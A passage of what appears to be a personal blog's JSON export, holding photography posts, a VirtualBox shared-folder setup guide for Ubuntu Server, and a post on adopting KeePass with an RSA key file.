e10a0019326d0c","permission_id":"5b8e9fcb0ce10a0019326d24"},{"id":"5b8e9fcf0ce10a0019326dbd","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d16"},{"id":"5b8e9fcf0ce10a0019326dbe","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d17"},{"id":"5b8e9fcf0ce10a0019326dbf","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d19"},{"id":"5b8e9fcf0ce10a0019326dc0","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d1b"},{"id":"5b8e9fcf0ce10a0019326dc1","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d1c"},{"id":"5b8e9fcf0ce10a0019326dc2","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d1e"},{"id":"5b8e9fcf0ce10a0019326dc3","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d1f"},{"id":"5b8e9fcf0ce10a0019326dc4","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d20"},{"id":"5b8e9fcf0ce10a0019326dc5","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d2a"},{"id":"5b8e9fcf0ce10a0019326dc6","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d2b"},{"id":"5b8e9fcf0ce10a0019326dc7","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d30"},{"id":"5b8e9fcf0ce10a0019326dc8","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d31"},{"id":"5b8e9fcf0ce10a0019326dc9","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d32"},{"id":"5b8e9fcf0ce10a0019326dca","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d33"},{"id":"5b8e9fcf0ce10a0019326dcb","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d34"},{"id":"5b8e9fcf0ce10a0019326dcc","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d35"},{"id":"5b8e9fcf0ce10a0019326dcd","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d39"},{"id":"5b8e9fcf0ce10a0019326dce","role_id":"5b8e9fcb0ce10a0019326d0d","permission_id":"5b8e9fcb0ce10a0019326d24"}],"permissions_users":[],"posts":[{"id":"5b8ea0567623330001332764","uuid":"9b823514-48ee-4d71-9f70-32dc19f43951","title":"November, 2015","slug":"november-2015","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nThe earliest photos from after I acquired my first DSLR.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>The earliest photos from after I acquired my first DSLR.</p>\n</div>","amp":"16","plaintext":"The earliest photos from after I acquired my first DSLR.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-11-30T12:00:17.000Z","created_by":"1","updated_at":"2015-11-30T12:00:17.000Z","updated_by":"1","published_at":"2015-11-30T12:00:17.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332765","uuid":"fc949036-3c17-4309-9931-ea3896eed50c","title":"December, 2015","slug":"december-2015_old","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI actually hav a few more photos from this month, but not all of them are developed. I’ll go through them one of these days.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I actually hav a few more photos from this month, but not all of them are developed. I’ll go through them one of these days.</p>\n</div>","amp":"27","plaintext":"I actually hav a few more photos from this month, but not all of them are\ndeveloped. I’ll go through them one of these days.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-12-31T12:00:26.000Z","created_by":"1","updated_at":"2015-12-31T12:00:26.000Z","updated_by":"1","published_at":"2015-12-31T12:00:26.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332766","uuid":"669eea2a-8f0b-4c82-943e-75684f2bab2e","title":"Photography: Jan 2016","slug":"photography-jan-2016","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n<figure class=\\\"wp-caption aligncenter\\\" id=\\\"attachment_109\\\" style=\\\"width: 300px\\\">[![Sunset in the Country](https://blog.tams.tech/wp-content/uploads/2016/01/IMG_9663.small_-300x200.jpg)](https://blog.tams.tech/wp-content/uploads/2016/01/IMG_9663.small_.jpg)<figcaption class=\\\"wp-caption-text\\\">A photo I took out of the windshield one day. This is a recent retouch (Dec 2016). The only effects are color-correction with curves and a single lens-flare effect.</figcaption></figure>\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><figure class=\"wp-caption aligncenter\" id=\"attachment_109\" style=\"width: 300px\">[![Sunset in the Country](https://blog.tams.tech/wp-content/uploads/2016/01/IMG_9663.small_-300x200.jpg)](https://blog.tams.tech/wp-content/uploads/2016/01/IMG_9663.small_.jpg)<figcaption class=\"wp-caption-text\">A photo I took out of the windshield one day. This is a recent retouch (Dec 2016). The only effects are color-correction with curves and a single lens-flare effect.</figcaption></figure>\n</div>","amp":"76","plaintext":"[![Sunset in the\nCountry](https://blog.tams.tech/wp-content/uploads/2016/01/IMG_9663.small_-300x200.jpg)](https://blog.tams.tech/wp-content/uploads/2016/01/IMG_9663.small_.jpg)\nA photo I took out of the windshield one day. This is a recent retouch (Dec\n2016). The only effects are color-correction with curves and a single lens-flare\neffect.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-01-31T12:00:15.000Z","created_by":"1","updated_at":"2016-01-31T12:00:15.000Z","updated_by":"1","published_at":"2016-01-31T12:00:15.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332767","uuid":"9cf42241-5330-4b49-939f-074d27b3f482","title":"Photography: Early 2016 - learning and experimenting","slug":"photography-early-2016-learning-and-experimenting","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nThe biggest reason I was excited to get a DSLR camera, with decent settings and whatnot, was to be able to do [long exposures](https://blog.tams.tech/wp-content/uploads/2015/12/bridgeWithSatellite.jpg). That was the [first](https://blog.tams.tech/wp-content/uploads/2015/12/IMG_9269.jpg) [thing](https://blog.tams.tech/wp-content/uploads/2015/11/ghostMe_casinoTheater.jpg) [I](https://blog.tams.tech/wp-content/uploads/2015/11/houseAtNight2.jpg) [did](https://blog.tams.tech/wp-content/uploads/2015/11/colorfulCompositeReduced.jpg). I experimented with it a bit, and then I moved on. And I’ve found that’s the way most things are for me with photography and music and I suppose art in general —  I want to try something, so I learn to do it, create the image or concept or learn a skill that I can take advantage of, and then stick it in my back pocket for later. Sure, I could go out every night and do long-exposure shots of the whole city, but what’s the point? I’ve done the experiments and learned how it worked, but without a subject, it feels hollow.\\n\\nWith the “[Peace, Love, and Happiness](https://blog.tams.tech/2017/02/peace-love-and-happiness-a-photo-series/)” series I shot, I began to focus on that subject and what sort of subjects I might focus on. I like doing long-exposure shots, and other creative work with time, because it shows how the subject of a photograph is four-dimensional. That is, when you are shooting a photo, you are capturing a certain instance in time. That subject in time may last a fleeting second, such that you have to shoot at tens of thousands of frames per second just to be able to [capture the event](https://youtu.be/xflY5uS-nnw?t=5m32s) in any meaningful manner, or the subject may last [longer than the existence](https://blog.tams.tech/wp-content/uploads/2016/01/IMG_9663.small_.jpg) of your entire species. Several of the art pieces have been covered up since I shot them. [One](https://blog.tams.tech/wp-content/uploads/2017/02/theActualPicture-retouch.jpg) of them in particular was covered up by a much more detailed mural, but the mural had no message. I thought the simplicity of the message in that case to be communicated in such a way that its conciseness was striking. Apologize for the digression, I really wish the art of graffiti was more widely appreciated.\\n\\nIn the case of most photos I took, especially in my early days of experimenting with photography, the subject would be one that did not pass in but a brief moment, instead being one that I could shoot several times over, giving me an opportunity to learn the mechanisms behind the way my camera was perceiving the data that I was perceiving so differently. Sometimes, I could use the camera to film details that wouldn’t be visible to the naked eye, and at others I was frustrated trying to capture a brief subject when that subject was also poorly lit.\\n\\nAnyway, I’ve rambled for 400 words instead of simply posting the pictures, and I’ll tell you what, I’m gonna rant more in the captions of each one, because these aren’t just pieces of art, and the subjects they film aren’t just a snapshot of a moment in time, but also a snapshot of my educational process as I learned how to apply the physics I already knew of how a camera perceives light. These are the last of the photos taken with my EOS 30D – which I replaced in June of 2016 to gain higher resolution and video capabilities with my Nikon D3300. More on that in my next post, though.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>The biggest reason I was excited to get a DSLR camera, with decent settings and whatnot, was to be able to do <a href=\"https://blog.tams.tech/wp-content/uploads/2015/12/bridgeWithSatellite.jpg\">long exposures</a>. That was the <a href=\"https://blog.tams.tech/wp-content/uploads/2015/12/IMG_9269.jpg\">first</a> <a href=\"https://blog.tams.tech/wp-content/uploads/2015/11/ghostMe_casinoTheater.jpg\">thing</a> <a href=\"https://blog.tams.tech/wp-content/uploads/2015/11/houseAtNight2.jpg\">I</a> <a href=\"https://blog.tams.tech/wp-content/uploads/2015/11/colorfulCompositeReduced.jpg\">did</a>. I experimented with it a bit, and then I moved on. And I’ve found that’s the way most things are for me with photography and music and I suppose art in general —  I want to try something, so I learn to do it, create the image or concept or learn a skill that I can take advantage of, and then stick it in my back pocket for later. Sure, I could go out every night and do long-exposure shots of the whole city, but what’s the point? I’ve done the experiments and learned how it worked, but without a subject, it feels hollow.</p>\n<p>With the “<a href=\"https://blog.tams.tech/2017/02/peace-love-and-happiness-a-photo-series/\">Peace, Love, and Happiness</a>” series I shot, I began to focus on that subject and what sort of subjects I might focus on. I like doing long-exposure shots, and other creative work with time, because it shows how the subject of a photograph is four-dimensional. That is, when you are shooting a photo, you are capturing a certain instance in time. That subject in time may last a fleeting second, such that you have to shoot at tens of thousands of frames per second just to be able to <a href=\"https://youtu.be/xflY5uS-nnw?t=5m32s\">capture the event</a> in any meaningful manner, or the subject may last <a href=\"https://blog.tams.tech/wp-content/uploads/2016/01/IMG_9663.small_.jpg\">longer than the existence</a> of your entire species. Several of the art pieces have been covered up since I shot them. <a href=\"https://blog.tams.tech/wp-content/uploads/2017/02/theActualPicture-retouch.jpg\">One</a> of them in particular was covered up by a much more detailed mural, but the mural had no message. I thought the simplicity of the message in that case to be communicated in such a way that its conciseness was striking. Apologize for the digression, I really wish the art of graffiti was more widely appreciated.</p>\n<p>In the case of most photos I took, especially in my early days of experimenting with photography, the subject would be one that did not pass in but a brief moment, instead being one that I could shoot several times over, giving me an opportunity to learn the mechanisms behind the way my camera was perceiving the data that I was perceiving so differently. Sometimes, I could use the camera to film details that wouldn’t be visible to the naked eye, and at others I was frustrated trying to capture a brief subject when that subject was also poorly lit.</p>\n<p>Anyway, I’ve rambled for 400 words instead of simply posting the pictures, and I’ll tell you what, I’m gonna rant more in the captions of each one, because these aren’t just pieces of art, and the subjects they film aren’t just a snapshot of a moment in time, but also a snapshot of my educational process as I learned how to apply the physics I already knew of how a camera perceives light. These are the last of the photos taken with my EOS 30D – which I replaced in June of 2016 to gain higher resolution and video capabilities with my Nikon D3300. More on that in my next post, though.</p>\n</div>","amp":"194","plaintext":"The biggest reason I was excited to get a DSLR camera, with decent settings and\nwhatnot, was to be able to do long exposures\n[https://blog.tams.tech/wp-content/uploads/2015/12/bridgeWithSatellite.jpg].\nThat was the first\n[https://blog.tams.tech/wp-content/uploads/2015/12/IMG_9269.jpg]  thing\n[https://blog.tams.tech/wp-content/uploads/2015/11/ghostMe_casinoTheater.jpg]  I\n[https://blog.tams.tech/wp-content/uploads/2015/11/houseAtNight2.jpg]  did\n[https://blog.tams.tech/wp-content/uploads/2015/11/colorfulCompositeReduced.jpg]\n. I experimented with it a bit, and then I moved on. And I’ve found that’s the\nway most things are for me with photography and music and I suppose art in\ngeneral —  I want to try something, so I learn to do it, create the image or\nconcept or learn a skill that I can take advantage of, and then stick it in my\nback pocket for later. Sure, I could go out every night and do long-exposure\nshots of the whole city, but what’s the point? I’ve done the experiments and\nlearned how it worked, but without a subject, it feels hollow.\n\nWith the “Peace, Love, and Happiness\n[https://blog.tams.tech/2017/02/peace-love-and-happiness-a-photo-series/]”\nseries I shot, I began to focus on that subject and what sort of subjects I\nmight focus on. I like doing long-exposure shots, and other creative work with\ntime, because it shows how the subject of a photograph is four-dimensional. That\nis, when you are shooting a photo, you are capturing a certain instance in time.\nThat subject in time may last a fleeting second, such that you have to shoot at\ntens of thousands of frames per second just to be able to capture the event\n[https://youtu.be/xflY5uS-nnw?t=5m32s]  in any meaningful manner, or the subject\nmay last longer than the existence\n[https://blog.tams.tech/wp-content/uploads/2016/01/IMG_9663.small_.jpg]  of your\nentire species. Several of the art pieces have been covered up since I shot\nthem. One\n[https://blog.tams.tech/wp-content/uploads/2017/02/theActualPicture-retouch.jpg] \n of them in particular was covered up by a much more detailed mural, but the\nmural had no message. I thought the simplicity of the message in that case to be\ncommunicated in such a way that its conciseness was striking. Apologize for the\ndigression, I really wish the art of graffiti was more widely appreciated.\n\nIn the case of most photos I took, especially in my early days of experimenting\nwith photography, the subject would be one that did not pass in but a brief\nmoment, instead being one that I could shoot several times over, giving me an\nopportunity to learn the mechanisms behind the way my camera was perceiving the\ndata that I was perceiving so differently. Sometimes, I could use the camera to\nfilm details that wouldn’t be visible to the naked eye, and at others I was\nfrustrated trying to capture a brief subject when that subject was also poorly\nlit.\n\nAnyway, I’ve rambled for 400 words instead of simply posting the pictures, and\nI’ll tell you what, I’m gonna rant more in the captions of each one, because\nthese aren’t just pieces of art, and the subjects they film aren’t just a\nsnapshot of a moment in time, but also a snapshot of my educational process as I\nlearned how to apply the physics I already knew of how a camera perceives light.\nThese are the last of the photos taken with my EOS 30D – which I replaced in\nJune of 2016 to gain higher resolution and video capabilities with my Nikon\nD3300. More on that in my next post, though.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-06-14T04:57:08.000Z","created_by":"1","updated_at":"2016-06-14T04:57:08.000Z","updated_by":"1","published_at":"2016-06-14T04:57:08.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332768","uuid":"0003b3ee-ac40-4e0a-bab9-6b4981d4670f","title":"Adding a shared folder to an Ubuntu Server VirtualBox guest","slug":"adding-a-shared-folder-to-an-ubuntu-server-virtualbox-guest","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nWhen you set up a virtualbox machine, almost always you need some sort of shared filesystem access. I find this almost always necessary for my VMs, except the one running my printer because that’s just small files and I can use rsync or scp.\\n\\nTo access a common set of files in a Virtualbox guest, you need to install the guest additions CD. When I first installed it, I tried mounting the folder and got this:\\n\\n> sbin/mount.vboxsf: mounting failed with the error: No such file or directory\\n\\nThe problem is it doesn’t tell you if there are missing dependencies – and there are. So, with this Ubuntu Server (16.04) guest, I had to install make, gcc, and dkms. I figured that out by looking in the /var/log/vboxadd-install.log, which originally was what clued me in that I needed make. Anyway, to get the guest additions in your Ubuntu server host, run these commands as root:\\n\\n> #!/bin/bash apt install -y make gcc dkms /opt/VBoxGuestAdditions-*/init/vboxadd setup\\n\\nAnd that’s it, now you can run\\n\\n> mount -t vboxsf Shared_Folder ~/Shared/\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>When you set up a virtualbox machine, almost always you need some sort of shared filesystem access. I find this almost always necessary for my VMs, except the one running my printer because that’s just small files and I can use rsync or scp.</p>\n<p>To access a common set of files in a Virtualbox guest, you need to install the guest additions CD. When I first installed it, I tried mounting the folder and got this:</p>\n<blockquote>\n<p>sbin/mount.vboxsf: mounting failed with the error: No such file or directory</p>\n</blockquote>\n<p>The problem is it doesn’t tell you if there are missing dependencies – and there are. So, with this Ubuntu Server (16.04) guest, I had to install make, gcc, and dkms. I figured that out by looking in the /var/log/vboxadd-install.log, which originally was what clued me in that I needed make. Anyway, to get the guest additions in your Ubuntu server host, run these commands as root:</p>\n<blockquote>\n<h1 id=\"binbashaptinstallymakegccdkmsoptvboxguestadditionsinitvboxaddsetup\">!/bin/bash apt install -y make gcc dkms /opt/VBoxGuestAdditions-*/init/vboxadd setup</h1>\n</blockquote>\n<p>And that’s it, now you can run</p>\n<blockquote>\n<p>mount -t vboxsf Shared_Folder ~/Shared/</p>\n</blockquote>\n</div>","amp":"38","plaintext":"When you set up a virtualbox machine, almost always you need some sort of shared\nfilesystem access. I find this almost always necessary for my VMs, except the\none running my printer because that’s just small files and I can use rsync or\nscp.\n\nTo access a common set of files in a Virtualbox guest, you need to install the\nguest additions CD. When I first installed it, I tried mounting the folder and\ngot this:\n\nsbin/mount.vboxsf: mounting failed with the error: No such file or directory\n\nThe problem is it doesn’t tell you if there are missing dependencies – and there\nare. So, with this Ubuntu Server (16.04) guest, I had to install make, gcc, and\ndkms. I figured that out by looking in the /var/log/vboxadd-install.log, which\noriginally was what clued me in that I needed make. Anyway, to get the guest\nadditions in your Ubuntu server host, run these commands as root:\n\n!/bin/bash apt install -y make gcc dkms /opt/VBoxGuestAdditions-*/init/vboxadd\nsetup\nAnd that’s it, now you can run\n\nmount -t vboxsf Shared_Folder ~/Shared/","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-12-14T19:37:28.000Z","created_by":"1","updated_at":"2016-12-14T19:37:28.000Z","updated_by":"1","published_at":"2016-12-14T19:37:28.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332769","uuid":"86d02974-59e8-465e-871a-c6acfae2d0bb","title":"Finally getting around to proper password management.","slug":"finally-getting-around-to-proper-password-management","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI had avoided a [password manager](https://en.wikipedia.org/wiki/Password_manager), to the expense of my personal security for quite some time, using one of five or six memorable passwords, with a few exceptions. A few months ago, I dropped the use of passwords in my SSH use in favor of 4096-bit RSA keys (I’ll write something up later and link it). However, I couldn’t handle the idea of letting a proprietary service like [LastPass](https://en.wikipedia.org/wiki/LastPass) having control over all my passwords. In light of the recent yahoo attacks [one](http://www.bbc.com/news/world-us-canada-38324527) and [two](http://www.bbc.com/news/technology-37936219) which is almost guaranteed to have affected you, as it did me, this seems even more important than before.\\n\\nA few weeks ago I decided to give [KeePass](https://en.wikipedia.org/wiki/KeePass) a test drive. So I took a few commonly used accounts and changed them over. I had heard of KeePass before, and it had all the features I wanted – open source, keeps the database local and encrypted, and was cross platform – even more so than I require, which is impressive to say the least! So after a few weeks of using it, I decided to completely switch yesterday. I’ll be honest with you – it took forever! I was surprised at how many accounts I had, and that was just the ones from [https://passwords.google.com](http://passwords.google.com)! It took me at least 6 hours just to go through and change all the passwords, or delete accounts I wasn’t using anymore. But now it’s done, and I can sit back knowing everything is secure……..\\n\\n<figure class=\\\"wp-caption aligncenter\\\" id=\\\"attachment_51\\\" style=\\\"width: 105px\\\">[![jk](http://tams.tech/blog/wp-content/uploads/2016/12/raw.gif)](http://tams.tech/blog/?attachment_id=51)<figcaption class=\\\"wp-caption-text\\\">lol not</figcaption></figure>So anyway setup is really simple, it’s just transitioning all the passwords that takes all the time.\\n\\nOn my Debian PC I installed it from the launchpad repo, by adding\\n\\n# KeePass repo deb http://ppa.launchpad.net/jtaylor/keepass/ubuntu xenial main deb-src http://ppa.launchpad.net/jtaylor/keepass/ubuntu xenial main\\n\\nto my /etc/apt/sources.list. (Note that you’ll need to [add the key from the keyserver](http://superuser.com/questions/620765/sudo-apt-key-adv-keyserver-keyserver-ubuntu-com-recv-7f0ceb10-command-return#621258) in order to install it). There are also very nice clients for [Windows](http://sourceforge.net/projects/keepass/files/KeePass%201.x/1.31/KeePass-1.31-Setup.exe/download?accel_key=77%3A1482606730%3Ahttp%253A//keepass.info/download.html%3A3daed592%24ac778960c7170a2a3e65b37730bafab3955c9eb5&click_id=decb285a-ca0c-11e6-a3c8-0200ac1d1d91&source=accel) and [Android](https://f-droid.org/repository/browse/?fdfilter=keepass&fdid=com.android.keepass) ([Play Store link](https://play.google.com/store/apps/details?id=com.android.keepass)), as well as [numerous options](http://keepass.info/download.html) for just about every operating system you might have used in the past 10 years.\\n\\nWhen you run it for the first time you’ll need to create your database. Just name it passwords.kdbx or something memorable and put it somewhere you can find it (I put it in ~/.keepass/). You’ll need the database file later. You also need to generate a key pair. This database should be backed up with both a high-entropy password *and* a 4096-bit (maximum length) RSA key. A password manager is a **single point of failure**, which is the exact reason I avoided them for so long and continue to avoid LastPass. This means that if someone gets *into* your .kdbx file, they have *everything.* Banking info, gmail, all of it. So you need two things – a mostly secure thing that you know, and a very secure thing that you *have*. This is important. If you backup a database to a cloud service, but exclude the key, that database will forever remain random noise to anyone who doesn’t have the key, even if they have the password. However, to use the database, you have to have the private key locally stored on any device you use the manager on, so you need to also lock it behind a strong passphrase to make sure that even if the private key *and * the database are stolen, it gives you a few hours to at least change the passwords on the most valuable accounts, if not all of them before the attacker could guess or brute-force your password.\\n\\nFor linux or mac you can simply run\\n\\nssh-keygen -b 4096 -t rsa\\n\\nfrom your terminal. For Windows, you’ll need [PuTTYgen](https://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe), for which you can find instructions here. If you *only* have Android, you can use ConnectBot to generate keys and then copy/paste them into TED to save them as text files. Then you need to transfer them over to your other devices alongside your .kdbx database.\\n\\nSo, let me go back over it again –\\n\\n1. Install [KeePass clients](http://keepass.info/download.html) to your machines. All of them.\\n2. Generate an RSA key pair.\\n3. Create the database, secured with the key pair *and* a strong, high-entropy passcode.\\n4. Change all of your passwords. Take your time, make sure you save after *every **single <span style=\\\"text-decoration: underline;\\\">change</span>***. I don’t need to impress upon you how precious this data is – it’s the keys to the kingdom.\\n5. Copy the database and private key file to any other devices you intend to log in with.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I had avoided a <a href=\"https://en.wikipedia.org/wiki/Password_manager\">password manager</a>, to the expense of my personal security for quite some time, using one of five or six memorable passwords, with a few exceptions. A few months ago, I dropped the use of passwords in my SSH use in favor of 4096-bit RSA keys (I’ll write something up later and link it). However, I couldn’t handle the idea of letting a proprietary service like <a href=\"https://en.wikipedia.org/wiki/LastPass\">LastPass</a> having control over all my passwords. In light of the recent yahoo attacks <a href=\"http://www.bbc.com/news/world-us-canada-38324527\">one</a> and <a href=\"http://www.bbc.com/news/technology-37936219\">two</a> which is almost guaranteed to have affected you, as it did me, this seems even more important than before.</p>\n<p>A few weeks ago I decided to give <a href=\"https://en.wikipedia.org/wiki/KeePass\">KeePass</a> a test drive. So I took a few commonly used accounts and changed them over. I had heard of KeePass before, and it had all the features I wanted – open source, keeps the database local and encrypted, and was cross platform – even more so than I require, which is impressive to say the least! So after a few weeks of using it, I decided to completely switch yesterday. I’ll be honest with you – it took forever! I was surprised at how many accounts I had, and that was just the ones from <a href=\"http://passwords.google.com\">https://passwords.google.com</a>! It took me at least 6 hours just to go through and change all the passwords, or delete accounts I wasn’t using anymore. But now it’s done, and I can sit back knowing everything is secure……..</p>\n<figure class=\"wp-caption aligncenter\" id=\"attachment_51\" style=\"width: 105px\">[![jk](http://tams.tech/blog/wp-content/uploads/2016/12/raw.gif)](http://tams.tech/blog/?attachment_id=51)<figcaption class=\"wp-caption-text\">lol not</figcaption></figure>So anyway setup is really simple, it’s just transitioning all the passwords that takes all the time.\n<p>On my Debian PC I installed it from the launchpad repo, by adding</p>\n<h1 id=\"keepassrepodebhttpppalaunchpadnetjtaylorkeepassubuntuxenialmaindebsrchttpppalaunchpadnetjtaylorkeepassubuntuxenialmain\">KeePass repo deb <a href=\"http://ppa.launchpad.net/jtaylor/keepass/ubuntu\">http://ppa.launchpad.net/jtaylor/keepass/ubuntu</a> xenial main deb-src <a href=\"http://ppa.launchpad.net/jtaylor/keepass/ubuntu\">http://ppa.launchpad.net/jtaylor/keepass/ubuntu</a> xenial main</h1>\n<p>to my /etc/apt/sources.list. (Note that you’ll need to <a href=\"http://superuser.com/questions/620765/sudo-apt-key-adv-keyserver-keyserver-ubuntu-com-recv-7f0ceb10-command-return#621258\">add the key from the keyserver</a> in order to install it). There are also very nice clients for <a href=\"http://sourceforge.net/projects/keepass/files/KeePass%201.x/1.31/KeePass-1.31-Setup.exe/download?accel_key=77%3A1482606730%3Ahttp%253A//keepass.info/download.html%3A3daed592%24ac778960c7170a2a3e65b37730bafab3955c9eb5&amp;click_id=decb285a-ca0c-11e6-a3c8-0200ac1d1d91&amp;source=accel\">Windows</a> and <a href=\"https://f-droid.org/repository/browse/?fdfilter=keepass&amp;fdid=com.android.keepass\">Android</a> (<a href=\"https://play.google.com/store/apps/details?id=com.android.keepass\">Play Store link</a>), as well as <a href=\"http://keepass.info/download.html\">numerous options</a> for just about every operating system you might have used in the past 10 years.</p>\n<p>When you run it for the first time you’ll need to create your database. Just name it passwords.kdbx or something memorable and put it somewhere you can find it (I put it in ~/.keepass/). You’ll need the database file later. You also need to generate a key pair. This database should be backed up with both a high-entropy password <em>and</em> a 4096-bit (maximum length) RSA key. A password manager is a <strong>single point of failure</strong>, which is the exact reason I avoided them for so long and continue to avoid LastPass. This means that if someone gets <em>into</em> your .kdbx file, they have <em>everything.</em> Banking info, gmail, all of it. So you need two things – a mostly secure thing that you know, and a very secure thing that you <em>have</em>. This is important. If you backup a database to a cloud service, but exclude the key, that database will forever remain random noise to anyone who doesn’t have the key, even if they have the password. However, to use the database, you have to have the private key locally stored on any device you use the manager on, so you need to also lock it behind a strong passphrase to make sure that even if the private key *and * the database are stolen, it gives you a few hours to at least change the passwords on the most valuable accounts, if not all of them before the attacker could guess or brute-force your password.</p>\n<p>For linux or mac you can simply run</p>\n<p>ssh-keygen -b 4096 -t rsa</p>\n<p>from your terminal. For Windows, you’ll need <a href=\"https://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe\">PuTTYgen</a>, for which you can find instructions here. If you <em>only</em> have Android, you can use ConnectBot to generate keys and then copy/paste them into TED to save them as text files. Then you need to transfer them over to your other devices alongside your .kdbx database.</p>\n<p>So, let me go back over it again –</p>\n<ol>\n<li>Install <a href=\"http://keepass.info/download.html\">KeePass clients</a> to your machines. All of them.</li>\n<li>Generate an RSA key pair.</li>\n<li>Create the database, secured with the key pair <em>and</em> a strong, high-entropy passcode.</li>\n<li>Change all of your passwords. Take your time, make sure you save after <em>every <strong>single <span style=\"text-decoration: underline;\">change</span></strong></em>. I don’t need to impress upon you how precious this data is – it’s the keys to the kingdom.</li>\n<li>Copy the database and private key file to any other devices you intend to log in with.</li>\n</ol>\n</div>","amp":"48","plaintext":"I had avoided a password manager\n[https://en.wikipedia.org/wiki/Password_manager], to the expense of my personal\nsecurity for quite some time, using one of five or six memorable passwords, with\na few exceptions. A few months ago, I dropped the use of passwords in my SSH use\nin favor of 4096-bit RSA keys (I’ll write something up later and link it).\nHowever, I couldn’t handle the idea of letting a proprietary service like \nLastPass [https://en.wikipedia.org/wiki/LastPass] having control over all my\npasswords. In light of the recent yahoo attacks one\n[http://www.bbc.com/news/world-us-canada-38324527] and two\n[http://www.bbc.com/news/technology-37936219] which is almost guaranteed to have\naffected you, as it did me, this seems even more important than before.\n\nA few weeks ago I decided to give KeePass\n[https://en.wikipedia.org/wiki/KeePass] a test drive. So I took a few commonly\nused accounts and changed them over. I had heard of KeePass before, and it had\nall the features I wanted – open source, keeps the database local and encrypted,\nand was cross platform – even more so than I require, which is impressive to say\nthe least! So after a few weeks of using it, I decided to completely switch\nyesterday. I’ll be honest with you – it took forever! I was surprised at how\nmany accounts I had, and that was just the ones from \nhttps://passwords.google.com [http://passwords.google.com]! It took me at least\n6 hours just to go through and change all the passwords, or delete accounts I\nwasn’t using anymore. But now it’s done, and I can sit back knowing 